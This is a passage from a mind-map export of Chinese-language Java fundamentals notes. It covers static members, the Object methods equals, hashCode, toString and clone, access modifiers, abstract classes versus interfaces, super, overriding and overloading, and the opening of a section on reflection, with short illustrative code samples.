</a>
    <p dir="auto">
      <strong>1. 静态变量</strong>
    </p>
    <ul dir="auto">
      <li>
        静态变量：又称为类变量，也就是说这个变量属于类的，类所有的实例都共享静态变量，可以直接通过类名来访问它。静态变量在内存中只存在一份。
      </li>
      <li>
        实例变量：每创建一个实例就会产生一个实例变量，它与该实例同生共死。
      </li>
    </ul>
    <pre>public class A {
    private int x;         // 实例变量
    private static int y;  // 静态变量
    public static void main(String[] args) {
        // int x = A.x;  // Non-static field 'x' cannot be referenced from a static context
        A a = new A();
        int x = a.x;
        int y = A.y;
    }
}</pre>
    <p dir="auto">
      <strong>2. 静态方法</strong>
    </p>
    <p dir="auto">
      静态方法在类加载的时候就存在了，它不依赖于任何实例。所以静态方法必须有实现，也就是说它不能是抽象方法。
    </p>
    <pre>public abstract class A {
    public static void func1(){
    }
    // public abstract static void func2();  // Illegal combination of modifiers: 'abstract' and 'static'
}</pre>
    <p dir="auto">
      只能访问所属类的静态字段和静态方法，方法中不能有 this 和 super 关键字，因为这两个关键字与具体对象关联。
    </p>
    <pre>public class A {
    private static int x;
    private int y;
    public static void func1(){
        int a = x;
        // int b = y;  // Non-static field 'y' cannot be referenced from a static context
        // int b = this.y;     // 'A.this' cannot be referenced from a static context
    }
}</pre>
    <p dir="auto">
      <strong>3. 静态语句块</strong>
    </p>
    <p dir="auto">
      静态语句块在类初始化时运行一次。
    </p>
    <pre>public class A {
    static {
        System.out.println(&quot;123&quot;);
    }
    public static void main(String[] args) {
        A a1 = new A();
        A a2 = new A();
    }
}</pre>
    <pre>123</pre>
    <p dir="auto">
      <strong>4. 静态内部类</strong>
    </p>
    <p dir="auto">
      非静态内部类依赖于外部类的实例，也就是说需要先创建外部类实例，才能用这个实例去创建非静态内部类。而静态内部类不需要。
    </p>
    <pre>public class OuterClass {
    class InnerClass {
    }
    static class StaticInnerClass {
    }
    public static void main(String[] args) {
        // InnerClass innerClass = new InnerClass(); // 'OuterClass.this' cannot be referenced from a static context
        OuterClass outerClass = new OuterClass();
        InnerClass innerClass = outerClass.new InnerClass();
        StaticInnerClass staticInnerClass = new StaticInnerClass();
    }
}</pre>
    <p dir="auto">
      静态内部类不能访问外部类的非静态的变量和方法。
    </p>
    <p dir="auto">
      <strong>5. 静态导包</strong>
    </p>
    <p dir="auto">
      在使用静态变量和方法时不用再指明 ClassName，从而简化代码，但可读性大大降低。
    </p>
    <pre>import static com.xxx.ClassName.*</pre>
    <p dir="auto">
      <strong>6. 初始化顺序</strong>
    </p>
    <p dir="auto">
      静态变量和静态语句块优先于实例变量和普通语句块，静态变量和静态语句块的初始化顺序取决于它们在代码中的顺序。
    </p>
    <pre>public static String staticField = &quot;静态变量&quot;;</pre>
    <pre>static {
    System.out.println(&quot;静态语句块&quot;);
}</pre>
    <pre>public String field = &quot;实例变量&quot;;</pre>
    <pre>{
    System.out.println(&quot;普通语句块&quot;);
}</pre>
    <p dir="auto">
      最后才是构造函数的初始化。
    </p>
    <pre>public InitialOrderTest() {
    System.out.println(&quot;构造函数&quot;);
}</pre>
    <p dir="auto">
      存在继承的情况下，初始化顺序为：
    </p>
    <ul dir="auto">
      <li>
        父类（静态变量、静态语句块）
      </li>
      <li>
        子类（静态变量、静态语句块）
      </li>
      <li>
        父类（实例变量、普通语句块）
      </li>
      <li>
        父类（构造函数）
      </li>
      <li>
        子类（实例变量、普通语句块）
      </li>
      <li>
        子类（构造函数）
      </li>
    </ul>
  </body>
</html></richcontent>
</node>
</node>
<node FOLDED="true" ID="ID_1601149843" CREATED="1754750650333" MODIFIED="1754750650333"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      五、Object 通用方法
    </p>
  </body>
</html>
</richcontent>
<node ID="ID_64378409" CREATED="1754750650335" MODIFIED="1754750650336"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      概览
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 概览" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20%E5%9F%BA%E7%A1%80.md#概览-1">
</a>
    <pre>public native int hashCode()
public boolean equals(Object obj)
protected native Object clone() throws CloneNotSupportedException
public String toString()
public final native Class&lt;?&gt; getClass()
protected void finalize() throws Throwable {}
public final native void notify()
public final native void notifyAll()
public final native void wait(long timeout) throws InterruptedException
public final void wait(long timeout, int nanos) throws InterruptedException
public final void wait() throws InterruptedException</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_1490433792" CREATED="1754750650337" MODIFIED="1754750650339"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      equals()
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: equals()" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20%E5%9F%BA%E7%A1%80.md#equals">
</a>
    <p dir="auto">
      <strong>1. 等价关系</strong>
    </p>
    <p dir="auto">
      两个对象具有等价关系，需要满足以下五个条件：
    </p>
    <p dir="auto">
      Ⅰ 自反性
    </p>
    <pre>x.equals(x); // true</pre>
    <p dir="auto">
      Ⅱ 对称性
    </p>
    <pre>x.equals(y) == y.equals(x); // true</pre>
    <p dir="auto">
      Ⅲ 传递性
    </p>
    <pre>if (x.equals(y) &amp;&amp; y.equals(z))
    x.equals(z); // true;</pre>
    <p dir="auto">
      Ⅳ 一致性
    </p>
    <p dir="auto">
      多次调用 equals() 方法结果不变
    </p>
    <pre>x.equals(y) == x.equals(y); // true</pre>
    <p dir="auto">
      Ⅴ 与 null 的比较
    </p>
    <p dir="auto">
      对任何不是 null 的对象 x 调用 x.equals(null) 结果都为 false
    </p>
    <pre>x.equals(null); // false;</pre>
    <p dir="auto">
      <strong>2. 等价与相等</strong>
    </p>
    <ul dir="auto">
      <li>
        对于基本类型，== 判断两个值是否相等，基本类型没有 equals() 方法。
      </li>
      <li>
        对于引用类型，== 判断两个变量是否引用同一个对象，而 equals() 判断引用的对象是否等价。
      </li>
    </ul>
    <pre>Integer x = new Integer(1);
Integer y = new Integer(1);
System.out.println(x.equals(y)); // true
System.out.println(x == y);      // false</pre>
    <p dir="auto">
      <strong>3. 实现</strong>
    </p>
    <ul dir="auto">
      <li>
        检查是否为同一个对象的引用，如果是直接返回 true；
      </li>
      <li>
        检查是否是同一个类型，如果不是，直接返回 false；
      </li>
      <li>
        将 Object 对象进行转型；
      </li>
      <li>
        判断每个关键域是否相等。
      </li>
    </ul>
    <pre>public class EqualExample {
    private int x;
    private int y;
    private int z;
    public EqualExample(int x, int y, int z) {
        this.x = x;
        this.y = y;
        this.z = z;
    }
    @Override
    public boolean equals(Object o) {
        if (this == o) return true;
        if (o == null || getClass() != o.getClass()) return false;
        EqualExample that = (EqualExample) o;
        if (x != that.x) return false;
        if (y != that.y) return false;
        return z == that.z;
    }
}</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_190293911" CREATED="1754750650339" MODIFIED="1754750650341"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      hashCode()
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: hashCode()" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20%E5%9F%BA%E7%A1%80.md#hashcode">
</a>
    <p dir="auto">
      hashCode() 返回哈希值，而 equals() 是用来判断两个对象是否等价。等价的两个对象散列值一定相同，但是散列值相同的两个对象不一定等价，这是因为计算哈希值具有随机性，两个值不同的对象可能计算出相同的哈希值。
    </p>
    <p dir="auto">
      在覆盖 equals() 方法时应当总是覆盖 hashCode() 方法，保证等价的两个对象哈希值也相等。
    </p>
    <p dir="auto">
      HashSet 和 HashMap 等集合类使用了 hashCode() 方法来计算对象应该存储的位置，因此要将对象添加到这些集合类中，需要让对应的类实现 hashCode() 方法。
    </p>
    <p dir="auto">
      下面的代码中，新建了两个等价的对象，并将它们添加到 HashSet 中。我们希望将这两个对象当成一样的，只在集合中添加一个对象。但是 EqualExample 没有实现 hashCode() 方法，因此这两个对象的哈希值是不同的，最终导致集合添加了两个等价的对象。
    </p>
    <pre>EqualExample e1 = new EqualExample(1, 1, 1);
EqualExample e2 = new EqualExample(1, 1, 1);
System.out.println(e1.equals(e2)); // true
HashSet&lt;EqualExample&gt; set = new HashSet&lt;&gt;();
set.add(e1);
set.add(e2);
System.out.println(set.size());   // 2</pre>
    <p dir="auto">
      理想的哈希函数应当具有均匀性，即不相等的对象应当均匀分布到所有可能的哈希值上。这就要求了哈希函数要把所有域的值都考虑进来。可以将每个域都当成 R 进制的某一位，然后组成一个 R 进制的整数。
    </p>
    <p dir="auto">
      R 一般取 31，因为它是一个奇素数，如果是偶数的话，当出现乘法溢出，信息就会丢失，因为与 2 相乘相当于向左移一位，最左边的位丢失。并且一个数与 31 相乘可以转换成移位和减法：<code>31*x == (x&lt;&lt;5)-x</code>，编译器会自动进行这个优化。
    </p>
    <pre>@Override
public int hashCode() {
    int result = 17;
    result = 31 * result + x;
    result = 31 * result + y;
    result = 31 * result + z;
    return result;
}</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_1958646302" CREATED="1754750650342" MODIFIED="1754750650344"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      toString()
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: toString()" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20%E5%9F%BA%E7%A1%80.md#tostring">
</a>
    <p dir="auto">
      默认返回 ToStringExample@4554617c 这种形式，其中 @ 后面的数值为散列码的无符号十六进制表示。
    </p>
    <pre>public class ToStringExample {
    private int number;
    public ToStringExample(int number) {
        this.number = number;
    }
}</pre>
    <pre>ToStringExample example = new ToStringExample(123);
System.out.println(example.toString());</pre>
    <pre>ToStringExample@4554617c</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_306297200" CREATED="1754750650344" MODIFIED="1754750650346"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      clone()
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: clone()" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20%E5%9F%BA%E7%A1%80.md#clone">
</a>
    <p dir="auto">
      <strong>1. cloneable</strong>
    </p>
    <p dir="auto">
      clone() 是 Object 的 protected 方法，它不是 public，一个类不显式去重写 clone()，其它类就不能直接去调用该类实例的 clone() 方法。
    </p>
    <pre>public class CloneExample {
    private int a;
    private int b;
}</pre>
    <pre>CloneExample e1 = new CloneExample();
// CloneExample e2 = e1.clone(); // 'clone()' has protected access in 'java.lang.Object'</pre>
    <p dir="auto">
      重写 clone() 得到以下实现：
    </p>
    <pre>public class CloneExample {
    private int a;
    private int b;
    @Override
    public CloneExample clone() throws CloneNotSupportedException {
        return (CloneExample)super.clone();
    }
}</pre>
    <pre>CloneExample e1 = new CloneExample();
try {
    CloneExample e2 = e1.clone();
} catch (CloneNotSupportedException e) {
    e.printStackTrace();
}</pre>
    <pre>java.lang.CloneNotSupportedException: CloneExample</pre>
    <p dir="auto">
      以上抛出了 CloneNotSupportedException，这是因为 CloneExample 没有实现 Cloneable 接口。
    </p>
    <p dir="auto">
      应该注意的是，clone() 方法并不是 Cloneable 接口的方法，而是 Object 的一个 protected 方法。Cloneable 接口只是规定，如果一个类没有实现 Cloneable 接口又调用了 clone() 方法，就会抛出 CloneNotSupportedException。
    </p>
    <pre>public class CloneExample implements Cloneable {
    private int a;
    private int b;
    @Override
    public Object clone() throws CloneNotSupportedException {
        return super.clone();
    }
}</pre>
    <p dir="auto">
      <strong>2. 浅拷贝</strong>
    </p>
    <p dir="auto">
      拷贝对象和原始对象的引用类型引用同一个对象。
    </p>
    <pre>public class ShallowCloneExample implements Cloneable {
    private int[] arr;
    public ShallowCloneExample() {
        arr = new int[10];
        for (int i = 0; i &lt; arr.length; i++) {
            arr[i] = i;
        }
    }
    public void set(int index, int value) {
        arr[index] = value;
    }
    public int get(int index) {
        return arr[index];
    }
    @Override
    protected ShallowCloneExample clone() throws CloneNotSupportedException {
        return (ShallowCloneExample) super.clone();
    }
}</pre>
    <pre>ShallowCloneExample e1 = new ShallowCloneExample();
ShallowCloneExample e2 = null;
try {
    e2 = e1.clone();
} catch (CloneNotSupportedException e) {
    e.printStackTrace();
}
e1.set(2, 222);
System.out.println(e2.get(2)); // 222</pre>
    <p dir="auto">
      <strong>3. 深拷贝</strong>
    </p>
    <p dir="auto">
      拷贝对象和原始对象的引用类型引用不同对象。
    </p>
    <pre>public class DeepCloneExample implements Cloneable {
    private int[] arr;
    public DeepCloneExample() {
        arr = new int[10];
        for (int i = 0; i &lt; arr.length; i++) {
            arr[i] = i;
        }
    }
    public void set(int index, int value) {
        arr[index] = value;
    }
    public int get(int index) {
        return arr[index];
    }
    @Override
    protected DeepCloneExample clone() throws CloneNotSupportedException {
        DeepCloneExample result = (DeepCloneExample) super.clone();
        result.arr = new int[arr.length];
        for (int i = 0; i &lt; arr.length; i++) {
            result.arr[i] = arr[i];
        }
        return result;
    }
}</pre>
    <pre>DeepCloneExample e1 = new DeepCloneExample();
DeepCloneExample e2 = null;
try {
    e2 = e1.clone();
} catch (CloneNotSupportedException e) {
    e.printStackTrace();
}
e1.set(2, 222);
System.out.println(e2.get(2)); // 2</pre>
    <p dir="auto">
      <strong>4. clone() 的替代方案</strong>
    </p>
    <p dir="auto">
      使用 clone() 方法来拷贝一个对象即复杂又有风险，它会抛出异常，并且还需要类型转换。Effective Java 书上讲到，最好不要去使用 clone()，可以使用拷贝构造函数或者拷贝工厂来拷贝一个对象。
    </p>
    <pre>public class CloneConstructorExample {
    private int[] arr;
    public CloneConstructorExample() {
        arr = new int[10];
        for (int i = 0; i &lt; arr.length; i++) {
            arr[i] = i;
        }
    }
    public CloneConstructorExample(CloneConstructorExample original) {
        arr = new int[original.arr.length];
        for (int i = 0; i &lt; original.arr.length; i++) {
            arr[i] = original.arr[i];
        }
    }
    public void set(int index, int value) {
        arr[index] = value;
    }
    public int get(int index) {
        return arr[index];
    }
}</pre>
    <pre>CloneConstructorExample e1 = new CloneConstructorExample();
CloneConstructorExample e2 = new CloneConstructorExample(e1);
e1.set(2, 222);
System.out.println(e2.get(2)); // 2</pre>
  </body>
</html></richcontent>
</node>
</node>
<node FOLDED="true" ID="ID_221861185" CREATED="1754750650347" MODIFIED="1754750650347"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      六、继承
    </p>
  </body>
</html>
</richcontent>
<node ID="ID_221721837" CREATED="1754750650349" MODIFIED="1754750650350"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      访问权限
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 访问权限" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20%E5%9F%BA%E7%A1%80.md#访问权限">
</a>
    <p dir="auto">
      Java 中有三个访问权限修饰符：private、protected 以及 public，如果不加访问修饰符，表示包级可见。
    </p>
    <p dir="auto">
      可以对类或类中的成员（字段和方法）加上访问修饰符。
    </p>
    <ul dir="auto">
      <li>
        类可见表示其它类可以用这个类创建实例对象。
      </li>
      <li>
        成员可见表示其它类可以用这个类的实例对象访问到该成员；
      </li>
    </ul>
    <p dir="auto">
      protected 用于修饰成员，表示在继承体系中成员对于子类可见，但是这个访问修饰符对于类没有意义。
    </p>
    <p dir="auto">
      设计良好的模块会隐藏所有的实现细节，把它的 API 与它的实现清晰地隔离开来。模块之间只通过它们的 API 进行通信，一个模块不需要知道其他模块的内部工作情况，这个概念被称为信息隐藏或封装。因此访问权限应当尽可能地使每个类或者成员不被外界访问。
    </p>
    <p dir="auto">
      如果子类的方法重写了父类的方法，那么子类中该方法的访问级别不允许低于父类的访问级别。这是为了确保可以使用父类实例的地方都可以使用子类实例去代替，也就是确保满足里氏替换原则。
    </p>
    <p dir="auto">
      字段决不能是公有的，因为这么做的话就失去了对这个字段修改行为的控制，客户端可以对其随意修改。例如下面的例子中，AccessExample 拥有 id 公有字段，如果在某个时刻，我们想要使用 int 存储 id 字段，那么就需要修改所有的客户端代码。
    </p>
    <pre>public class AccessExample {
    public String id;
}</pre>
    <p dir="auto">
      可以使用公有的 getter 和 setter 方法来替换公有字段，这样的话就可以控制对字段的修改行为。
    </p>
    <pre>public class AccessExample {
    private int id;
    public String getId() {
        return id + &quot;&quot;;
    }
    public void setId(String id) {
        this.id = Integer.valueOf(id);
    }
}</pre>
    <p dir="auto">
      但是也有例外，如果是包级私有的类或者私有的嵌套类，那么直接暴露成员不会有特别大的影响。
    </p>
    <pre>public class AccessWithInnerClassExample {
    private class InnerClass {
        int x;
    }
    private InnerClass innerClass;
    public AccessWithInnerClassExample() {
        innerClass = new InnerClass();
    }
    public int getValue() {
        return innerClass.x;  // 直接访问
    }
}</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_1361480770" CREATED="1754750650351" MODIFIED="1754750650353"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      抽象类与接口
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 抽象类与接口" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20%E5%9F%BA%E7%A1%80.md#抽象类与接口">
</a>
    <p dir="auto">
      <strong>1. 抽象类</strong>
    </p>
    <p dir="auto">
      抽象类和抽象方法都使用 abstract 关键字进行声明。如果一个类中包含抽象方法，那么这个类必须声明为抽象类。
    </p>
    <p dir="auto">
      抽象类和普通类最大的区别是，抽象类不能被实例化，只能被继承。
    </p>
    <pre>public abstract class AbstractClassExample {
    protected int x;
    private int y;
    public abstract void func1();
    public void func2() {
        System.out.println(&quot;func2&quot;);
    }
}</pre>
    <pre>public class AbstractExtendClassExample extends AbstractClassExample {
    @Override
    public void func1() {
        System.out.println(&quot;func1&quot;);
    }
}</pre>
    <pre>// AbstractClassExample ac1 = new AbstractClassExample(); // 'AbstractClassExample' is abstract; cannot be instantiated
AbstractClassExample ac2 = new AbstractExtendClassExample();
ac2.func1();</pre>
    <p dir="auto">
      <strong>2. 接口</strong>
    </p>
    <p dir="auto">
      接口是抽象类的延伸，在 Java 8 之前，它可以看成是一个完全抽象的类，也就是说它不能有任何的方法实现。
    </p>
    <p dir="auto">
      从 Java 8 开始，接口也可以拥有默认的方法实现，这是因为不支持默认方法的接口的维护成本太高了。在 Java 8 之前，如果一个接口想要添加新的方法，那么要修改所有实现了该接口的类，让它们都实现新增的方法。
    </p>
    <p dir="auto">
      接口的成员（字段 + 方法）默认都是 public 的，并且不允许定义为 private 或者 protected。从 Java 9 开始，允许将方法定义为 private，这样就能定义某些复用的代码又不会把方法暴露出去。
    </p>
    <p dir="auto">
      接口的字段默认都是 static 和 final 的。
    </p>
    <pre>public interface InterfaceExample {
    void func1();
    default void func2(){
        System.out.println(&quot;func2&quot;);
    }
    int x = 123;
    // int y;               // Variable 'y' might not have been initialized
    public int z = 0;       // Modifier 'public' is redundant for interface fields
    // private int k = 0;   // Modifier 'private' not allowed here
    // protected int l = 0; // Modifier 'protected' not allowed here
    // private void fun3(); // Modifier 'private' not allowed here
}</pre>
    <pre>public class InterfaceImplementExample implements InterfaceExample {
    @Override
    public void func1() {
        System.out.println(&quot;func1&quot;);
    }
}</pre>
    <pre>// InterfaceExample ie1 = new InterfaceExample(); // 'InterfaceExample' is abstract; cannot be instantiated
InterfaceExample ie2 = new InterfaceImplementExample();
ie2.func1();
System.out.println(InterfaceExample.x);</pre>
    <p dir="auto">
      <strong>3. 比较</strong>
    </p>
    <ul dir="auto">
      <li>
        从设计层面上看，抽象类提供了一种 IS-A 关系，需要满足里式替换原则，即子类对象必须能够替换掉所有父类对象。而接口更像是一种 LIKE-A 关系，它只是提供一种方法实现契约，并不要求接口和实现接口的类具有 IS-A 关系。
      </li>
      <li>
        从使用上来看，一个类可以实现多个接口，但是不能继承多个抽象类。
      </li>
      <li>
        接口的字段只能是 static 和 final 类型的，而抽象类的字段没有这种限制。
      </li>
      <li>
        接口的成员只能是 public 的，而抽象类的成员可以有多种访问权限。
      </li>
    </ul>
    <p dir="auto">
      <strong>4. 使用选择</strong>
    </p>
    <p dir="auto">
      使用接口：
    </p>
    <ul dir="auto">
      <li>
        需要让不相关的类都实现一个方法，例如不相关的类都可以实现 Comparable 接口中的 compareTo() 方法；
      </li>
      <li>
        需要使用多重继承。
      </li>
    </ul>
    <p dir="auto">
      使用抽象类：
    </p>
    <ul dir="auto">
      <li>
        需要在几个相关的类中共享代码。
      </li>
      <li>
        需要能控制继承来的成员的访问权限，而不是都为 public。
      </li>
      <li>
        需要继承非静态和非常量字段。
      </li>
    </ul>
    <p dir="auto">
      在很多情况下，接口优先于抽象类。因为接口没有抽象类严格的类层次结构要求，可以灵活地为一个类添加行为。并且从 Java 8 开始，接口也可以有默认的方法实现，使得修改接口的成本也变的很低。
    </p>
    <ul dir="auto">
      <li>
        <a href="https://docs.oracle.com/javase/tutorial/java/IandI/abstract.html" rel="nofollow">Abstract Methods and Classes</a>
      </li>
      <li>
        <a href="https://www.ibm.com/developerworks/cn/java/l-javainterface-abstract/" rel="nofollow">深入理解 abstract class 和 interface</a>
      </li>
      <li>
        <a href="https://dzone.com/articles/when-to-use-abstract-class-and-intreface" rel="nofollow">When to Use Abstract Class and Interface</a>
      </li>
      <li>
        <a href="https://www.journaldev.com/12850/java-9-private-methods-interfaces" rel="nofollow">Java 9 Private Methods in Interfaces</a>
      </li>
    </ul>
  </body>
</html></richcontent>
</node>
<node ID="ID_480009308" CREATED="1754750650354" MODIFIED="1754750650355"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      super
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: super" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20%E5%9F%BA%E7%A1%80.md#super">
</a>
    <ul dir="auto">
      <li>
        访问父类的构造函数：可以使用 super() 函数访问父类的构造函数，从而委托父类完成一些初始化的工作。应该注意到，子类一定会调用父类的构造函数来完成初始化工作，一般是调用父类的默认构造函数，如果子类需要调用父类其它构造函数，那么就可以使用 super() 函数。
      </li>
      <li>
        访问父类的成员：如果子类重写了父类的某个方法，可以通过使用 super 关键字来引用父类的方法实现。
      </li>
    </ul>
    <pre>public class SuperExample {
    protected int x;
    protected int y;
    public SuperExample(int x, int y) {
        this.x = x;
        this.y = y;
    }
    public void func() {
        System.out.println(&quot;SuperExample.func()&quot;);
    }
}</pre>
    <pre>public class SuperExtendExample extends SuperExample {
    private int z;
    public SuperExtendExample(int x, int y, int z) {
        super(x, y);
        this.z = z;
    }
    @Override
    public void func() {
        super.func();
        System.out.println(&quot;SuperExtendExample.func()&quot;);
    }
}</pre>
    <pre>SuperExample e = new SuperExtendExample(1, 2, 3);
e.func();</pre>
    <pre>SuperExample.func()
SuperExtendExample.func()</pre>
    <p dir="auto">
      <a href="https://docs.oracle.com/javase/tutorial/java/IandI/super.html" rel="nofollow">Using the Keyword super</a>
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_1431001219" CREATED="1754750650356" MODIFIED="1754750650358"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      重写与重载
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 重写与重载" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20%E5%9F%BA%E7%A1%80.md#重写与重载">
</a>
    <p dir="auto">
      <strong>1. 重写（Override）</strong>
    </p>
    <p dir="auto">
      存在于继承体系中，指子类实现了一个与父类在方法声明上完全相同的一个方法。
    </p>
    <p dir="auto">
      为了满足里式替换原则，重写有以下三个限制：
    </p>
    <ul dir="auto">
      <li>
        子类方法的访问权限必须大于等于父类方法；
      </li>
      <li>
        子类方法的返回类型必须是父类方法返回类型或为其子类型。
      </li>
      <li>
        子类方法抛出的异常类型必须是父类抛出异常类型或为其子类型。
      </li>
    </ul>
    <p dir="auto">
      使用 @Override 注解，可以让编译器帮忙检查是否满足上面的三个限制条件。
    </p>
    <p dir="auto">
      下面的示例中，SubClass 为 SuperClass 的子类，SubClass 重写了 SuperClass 的 func() 方法。其中：
    </p>
    <ul dir="auto">
      <li>
        子类方法访问权限为 public，大于父类的 protected。
      </li>
      <li>
        子类的返回类型为 ArrayList&lt;Integer&gt;，是父类返回类型 List&lt;Integer&gt; 的子类。
      </li>
      <li>
        子类抛出的异常类型为 Exception，是父类抛出异常 Throwable 的子类。
      </li>
      <li>
        子类重写方法使用 @Override 注解，从而让编译器自动检查是否满足限制条件。
      </li>
    </ul>
    <pre>class SuperClass {
    protected List&lt;Integer&gt; func() throws Throwable {
        return new ArrayList&lt;&gt;();
    }
}
class SubClass extends SuperClass {
    @Override
    public ArrayList&lt;Integer&gt; func() throws Exception {
        return new ArrayList&lt;&gt;();
    }
}</pre>
    <p dir="auto">
      在调用一个方法时，先从本类中查找看是否有对应的方法，如果没有再到父类中查看，看是否从父类继承来。否则就要对参数进行转型，转成父类之后看是否有对应的方法。总的来说，方法调用的优先级为：
    </p>
    <ul dir="auto">
      <li>
        this.func(this)
      </li>
      <li>
        super.func(this)
      </li>
      <li>
        this.func(super)
      </li>
      <li>
        super.func(super)
      </li>
    </ul>
    <pre>/*
    A
    |
    B
    |
    C
    |
    D
 */
class A {
    public void show(A obj) {
        System.out.println(&quot;A.show(A)&quot;);
    }
    public void show(C obj) {
        System.out.println(&quot;A.show(C)&quot;);
    }
}
class B extends A {
    @Override
    public void show(A obj) {
        System.out.println(&quot;B.show(A)&quot;);
    }
}
class C extends B {
}
class D extends C {
}</pre>
    <pre>public static void main(String[] args) {
    A a = new A();
    B b = new B();
    C c = new C();
    D d = new D();
    // 在 A 中存在 show(A obj)，直接调用
    a.show(a); // A.show(A)
    // 在 A 中不存在 show(B obj)，将 B 转型成其父类 A
    a.show(b); // A.show(A)
    // 在 B 中存在从 A 继承来的 show(C obj)，直接调用
    b.show(c); // A.show(C)
    // 在 B 中不存在 show(D obj)，但是存在从 A 继承来的 show(C obj)，将 D 转型成其父类 C
    b.show(d); // A.show(C)
    // 引用的还是 B 对象，所以 ba 和 b 的调用结果一样
    A ba = new B();
    ba.show(c); // A.show(C)
    ba.show(d); // A.show(C)
}</pre>
    <p dir="auto">
      <strong>2. 重载（Overload）</strong>
    </p>
    <p dir="auto">
      存在于同一个类中，指一个方法与已经存在的方法名称上相同，但是参数类型、个数、顺序至少有一个不同。
    </p>
    <p dir="auto">
      应该注意的是，返回值不同，其它都相同不算是重载。
    </p>
    <pre>class OverloadingExample {
    public void show(int x) {
        System.out.println(x);
    }
    public void show(int x, String y) {
        System.out.println(x + &quot; &quot; + y);
    }
}</pre>
    <pre>public static void main(String[] args) {
    OverloadingExample example = new OverloadingExample();
    example.show(1);
    example.show(1, &quot;2&quot;);
}</pre>
  </body>
</html></richcontent>
</node>
</node>
<node ID="ID_1450693941" CREATED="1754750650358" MODIFIED="1754750650360"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      七、反射
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 七、反射" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20%E5%9F%BA%E7%A1%80.md#七反射">
</a>
    <p dir="auto">
      每个类都有一个 <strong>Class</strong>&#xa0;对象，包含了与类有关的信息。当编译一个新类时，会产生一个同名的 .class 文件，该文件内容保存着 Class 对象。
    </p>
    <p dir="auto">
      类加载相当于 Class 对象的加载，类在第一次使用时才动态加载到 JVM 中。也可以使用 <code>Class.forName(&quot;com.mysql.jdbc.Driver&quot;)</code>&#xa0;这种方式来控制类的加载，该方法会返回一个 Class 对象。
    </p>
    <p dir="auto">
      反射可以提供运行时的类信息，并且这个类可以在运行时才加载进来，甚至在编译时期该类的 .class 不存在也可以加载进来。
    </p>
    <p dir="auto">
      Class 和 java.lang.reflect 一起对反射提供了支持，java.lang.reflect 类库主要包含了以下三个类：
    </p>
    <ul dir="auto">
      <li>
        <strong>Field</strong>&#xa0;：可以使用 get() 和 set() 方法读取和修改 Field 对象关联的字段；
      </li>
      <li>
        <strong>Method</strong>&#xa0;：可以使用 invoke() 方法调用与 Method 对象关联的方法；
      </li>
      <li>
        <strong>Constructor</strong>&#xa0;：可以用 Constructor 的 newInstance() 创建新的对象。
      </li>
    </ul>
    <p dir="auto">
      <strong>反射的优点：</strong>
    </p>
    <ul dir="auto">
      <li>
        <strong>可扩展性</strong>&#xa0;：应用程序可以利用全限定名创建可扩展对象的实例，来使用来自外部的用户自定义类。
      </li>
      <li>
        <strong>类浏览器和可视化开发环境</strong>&#xa0;：一个类浏览器需要可以枚举类的成员。可视化开发环境（如 IDE）可以从利用反射中可用的类型信息中受益，以帮助程序员编写正确的代码。
      </li>
      <li>
        <strong>调试器和测试工具</strong>&#xa0;： 调试器需要能够检查一个类里的私有成员。测试工具可以利用反射来自动地调用类里定义的可被发现的 API 定义，以确保一组测试中有较高的代码覆盖率。
      </li>
    </ul>
    <p dir="auto">
      <strong>反射的缺点：</strong>
    </p>
    <p dir="auto">
